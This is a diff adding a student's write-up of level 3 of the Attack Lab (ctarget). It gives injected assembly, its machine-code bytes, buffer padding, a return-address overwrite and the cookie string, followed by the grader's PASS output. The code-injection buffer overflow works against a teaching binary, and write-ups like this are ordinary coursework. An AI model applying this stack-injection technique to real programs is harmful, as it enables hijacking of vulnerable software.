@@ -269,4 +269,62 @@ we can seemingly understand that what we should do here is
 
 #### 2.3.1. Attempt Thoughts
 
+most steps the same with level 2  
+here we only mention the important part  
+
+1. how to insert string?  
+    translate the string to hex  
+
+2. how to terminate the string?  
+    and we can find we can't insert '\0'  
+
+    so we choose use instruction to insert '0x00' after the string  
+    to terminate the string
+
 #### 2.3.2. Process Record
+
+1. find address of `touch3`  
+2. program the instructions  
+
+    ```asm
+    pushq $0x000000000040188d
+    movabs $0x5565d438, %rdi
+    movb $0x00, 8(%rdi)
+    ret
+    ```
+
+3. translate into machine code  
+    *actually something confusing happens here*  
+    *firstly, I try to put the string between the instructions and the ret addr of 'getbuf'*  
+    *but, the string will be override by following invoking of functions*  
+    *so, finally I put the string after the ret addr*  
+
+    ```txt
+    68 8d 18 40 00 /*           pushq $0x000000000040188d   # the address of touch3 */ 
+    48 bf 38 d4 65 55 00 00
+    00 00 /*                    movabs $0x5565d438, %rdi    # pass the address of the string as the touch3 param */ 
+    c6 47 08 00 /*              movb $0x00, 8(%rdi)         # insert '\0' to terminate the string */ 
+    c3 /*                       ret                         # instructions total 20 bytes */ 
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 /*              meaningless values to fill the buffer */ 
+    08 d4 65 55 00 00 00 00 /*  overwrite the ret addr of getbuf with 0x5565d408 */ 
+    37 32 64 66 65 37 61 64 /*  0x72dfe7ad translated to ascii (should be treated as char array) */ 
+    ```
+
+4. deploy the exploit string  
+
+5. record  
+
+    ```txt
+    Type string:Touch3!: You called touch3("72dfe7ad")
+    Valid solution for level 3 with target ctarget
+    PASS: Sent exploit string to server to be validated.
+    NICE JOB!
+    ```
+
+**Summary:**  
+
+`0x00` can't be inserted in the string directly  
+(except for it is in the instructions)  
+maybe  
